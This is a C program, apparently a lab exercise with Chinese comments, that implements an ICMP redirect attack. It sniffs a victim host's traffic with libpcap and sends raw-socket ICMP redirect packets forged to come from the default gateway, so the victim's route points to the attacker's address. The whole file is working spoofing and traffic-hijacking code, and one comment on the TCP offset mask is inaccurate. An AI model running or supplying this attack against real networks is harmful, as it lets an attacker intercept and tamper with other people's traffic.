#include <arpa/inet.h> //protocol字段定义在netinet/in.h中，常见的包括IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP和IPPROTO_RAW
#include <netinet/in.h> // 包含定义套接字地址结构的 struct sockaddr_in
#include <netinet/ip_icmp.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define MAX 1024
#define SIZE_ETHERNET 14
#define BUFFER_SIZE 65535
#define ETHER_ADDR_LEN 6

/* Ethernet header */
struct sniff_ethernet {
  u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
  u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */
  u_short ether_type;                 /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
  u_char ip_vhl;                 /* version << 4 | header length >> 2 */
  u_char ip_tos;                 /* type of service */
  u_short ip_len;                /* total length */
  u_short ip_id;                 /* identification */
  u_short ip_off;                /* fragment offset field */
#define IP_RF 0x8000             /* reserved fragment flag */
#define IP_DF 0x4000             /* don't fragment flag */
#define IP_MF 0x2000             /* more fragments flag */
#define IP_OFFMASK 0x1fff        /* mask for fragmenting bits */
  u_char ip_ttl;                 /* time to live */
  u_char ip_p;                   /* protocol */
  u_short ip_sum;                /* checksum */
  struct in_addr ip_src, ip_dst; /* source and dest address */
};
#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f) /*IP数据报头部长度*/
#define IP_V(ip) (((ip)->ip_vhl) >> 4)    /*IP数据报版本*/

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
  u_short th_sport; /* source port */
  u_short th_dport; /* destination port */
  tcp_seq th_seq;   /* sequence number */
  tcp_seq th_ack;   /* acknowledgement number */
  u_char th_offx2;  /* data offset, rsvd */
#define TH_OFF(th)                                                                             \
  (((th)->th_offx2 & 0xf0) >>                                                                  \
   4) /*用于从 TCP 报头中提取报头长度字段的值,(th)->th_offx2 & 0xf0            \
         执行的操作是将 th_offx2 中的值与 0xf0 进行按位与操作，这将保留 \
         th_offx2 的高 8 位，而丢弃低 24 位。*/
  u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
  u_short th_win; /* window */
  u_short th_sum; /* checksum */
  u_short th_urp; /* urgent pointer */
};

const char *TARGET_IP;  /*受害主机IP地址*/
const char *GATEWAY_IP; /*默认网关IP地址*/
const char *SOURCE_IP = "192.168.26.137";

/*计算校验和*/
unsigned short in_cksum(unsigned short *addr, int len) {
  int sum = 0;
  unsigned short res = 0;
  while (len > 1) {
    sum += *addr++;
    len -= 2; /*len以字节为单位，每计算完一个16位的块，len长度减少2个字节*/
  }
  if (len ==
      1) { /*在处理完所有16位值后，如果还剩下一个8位值没有处理，进入条件语句。*/
    *((unsigned char *)(&res)) = *(
        (unsigned char *)
            addr); /*这行代码执行了类型转换和位操作，将res中的低8位设置为addr指针指向的8位数据的值。*/
    sum += res;
  }
  sum = (sum >> 16) +
        (sum & 0xffff); /*将 sum 变量的高16位和低16位相加，以确保不溢出*/
  sum += (sum >> 16);
  res = ~sum;
  return res;
}

void icmp_redirect(int sockfd, const unsigned char *data, int datalen) {
  printf("icmp_redirect to %s\n", SOURCE_IP);
  struct sockaddr_in target;

  struct packet {
    struct iphdr ip;
    struct icmphdr icmp;
    char data[28];
  } packet;

  bzero(&packet, sizeof(packet));
  packet.ip.version = 4;
  packet.ip.ihl = 5;
  packet.ip.tos = 0;
  packet.ip.tot_len = htons(56);
  packet.ip.id = getpid();
  packet.ip.frag_off = 0;
  packet.ip.ttl = 255;
  packet.ip.protocol = IPPROTO_ICMP;
  packet.ip.check = 1;
  /* 攻击者IP地址伪造成默认网关*/
  if (inet_pton(AF_INET, GATEWAY_IP, &packet.ip.saddr) <= 0) {
    printf("Invalid IP source address format\n");
  }
  /* 将伪造的重定向包发送给受害者IP地址 */
  if (inet_pton(AF_INET, TARGET_IP, &packet.ip.daddr) <= 0) {
    printf("Invalid IP destination address format\n");
  }

  packet.icmp.type = ICMP_REDIRECT;
  packet.icmp.code = 0;
  packet.icmp.checksum = 0;

  if (inet_pton(AF_INET, SOURCE_IP, &packet.icmp.un.gateway) <= 0) {
    printf("Invalid IP address format\n");
  }

  memcpy(packet.data, (data + SIZE_ETHERNET), 28);
  packet.ip.check = in_cksum((unsigned short *)&packet.ip, sizeof(packet.ip));
  packet.icmp.checksum =
      in_cksum((unsigned short *)&packet.icmp, sizeof(packet.icmp) + 28);

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(TARGET_IP);

  sendto(sockfd, &packet, 56, 0, (struct sockaddr *)&target, sizeof(target));
}
void get_packet(u_char *arg, const struct pcap_pkthdr *packet_header,
                const u_char *packet) {
  int sockfd;
  const int on = 1;

  const struct sniff_ethernet *ethernet;
  const struct sniff_ip *ip;

  int size_ip;

  ethernet = (struct sniff_ethernet *)(packet);

  ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
  size_ip = IP_HL(ip) * 4;
  if (size_ip < 20) {
    printf("* Invalid IP header length: %u bytes\n", size_ip);
    return;
  }
  printf("source_ip : %s\n\n", SOURCE_IP);

  /* 创建raw socket套接字*/
  if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
    printf("create socket error \n");
    exit(-1);
  }

  /* 设置IP_HDRINCL选项以更改ICMP数据报头部信息 */
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0) {
    printf("set socket option error\n");
    exit(-1);
  }

  icmp_redirect(sockfd, packet, 0);
}
int main(int argc, char *argv[]) {

  if (argc == 2) {
    TARGET_IP = argv[1];
  } else {
    fprintf(stderr, "error: unrecognized command-line options\n");
    exit(EXIT_FAILURE);
  }

  /*在VMware虚拟机内默认网关地址都是.2结尾*/
  GATEWAY_IP = (char *)malloc(strlen(TARGET_IP) + 1);
  strcpy(GATEWAY_IP, TARGET_IP);
  char *lastdot = strrchr(GATEWAY_IP, '.');
  if (lastdot != NULL) {
    *(lastdot + 1) = '2';
    *(lastdot + 2) = '\0';
  }

  char *dev;
  char errbuf[PCAP_ERRBUF_SIZE];

  bpf_u_int32 mask;
  bpf_u_int32 net;
  struct pcap_pkthdr header;
  const u_char *packet;

  /*获取默认监听设备*/
  dev = pcap_lookupdev(errbuf);
  if (dev == NULL) {
    fprintf(stderr, "Couldn't find the default device: %s\n", errbuf);
    return (2);
  } else {
    printf("Device: %s\n", dev);
  }

  /* get network number and mask associated with capture device,
   * 因为后面对包过滤的函数pcap_compile需要net的参数 */
  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
    fprintf(stderr, "Couldn't get netmask for device %s : %s\n", dev, errbuf);
    net = 0;
    mask = 0;
  }

  /* open capture device,获得捕获设备的全局句柄handle，代表了捕获对话的上下文 */
  pcap_t *handle = pcap_open_live(dev, BUFFER_SIZE, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "Couldn't open device %s : %s \n", dev, errbuf);
    return (2);
  } else {
    printf("Open device: %s\n", dev);
  }

  /* compile the filter expression */
  struct bpf_program fp;
  char filter_exp[50] = {0};
  snprintf(filter_exp, sizeof(filter_exp),
           "src host %s and dst host 202.38.64.3", TARGET_IP);

  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    fprintf(stderr, "Coudn't install filter %s : %s\n", filter_exp,
            pcap_geterr(handle));
    return (2);
  }

  /* apply the compiled filter */
  if (pcap_setfilter(handle, &fp) == -1) {
    fprintf(stderr, "Coudn't install filter %s : %s\n", filter_exp,
            pcap_geterr(handle));
    return (2);
  }

  if (pcap_loop(handle, -1, get_packet, NULL) < 0) {
    printf("pcap loop error\n");
  }

  pcap_freecode(&fp);
  pcap_close(handle);

  return 0;
}
